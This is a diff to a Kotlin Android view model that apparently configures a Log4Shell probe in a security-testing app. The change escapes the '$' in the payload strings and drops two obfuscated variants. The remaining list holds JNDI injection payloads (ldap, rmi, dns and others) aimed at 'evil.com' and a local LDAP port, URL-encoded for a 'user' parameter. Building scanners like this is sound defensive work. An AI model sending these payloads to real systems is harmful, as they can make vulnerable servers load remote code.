@@ -221,16 +221,14 @@ class GenericTestConfigureViewModel @Inject constructor() : ViewModel() {
             )
             "Log4ShellProbe" -> TestParameters(
                 payloadList = listOf(
-                    "${jndi:ldap://evil.com/a}",
-                    "${jndi:rmi://evil.com/a}",
-                    "${jndi:dns://evil.com/a}",
-                    "${jndi:iiop://evil.com/a}",
-                    "${jndi:nds://evil.com/a}",
-                    "${jndi:corba://evil.com/a}",
-                    "${jndi:nis://evil.com/a}",
-                    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
-                    "${${::-j}ndi:rmi://evil.com/a}",
-                    "${jndi:ldap://127.0.0.1:1389/a}"
+                    "\${jndi:ldap://evil.com/a}",
+                    "\${jndi:rmi://evil.com/a}",
+                    "\${jndi:dns://evil.com/a}",
+                    "\${jndi:iiop://evil.com/a}",
+                    "\${jndi:nds://evil.com/a}",
+                    "\${jndi:corba://evil.com/a}",
+                    "\${jndi:nis://evil.com/a}",
+                    "\${jndi:ldap://127.0.0.1:1389/a}"
                 ),
                 encodingMode = EncodingMode.URL_ENCODE,
                 targetParam = "user",
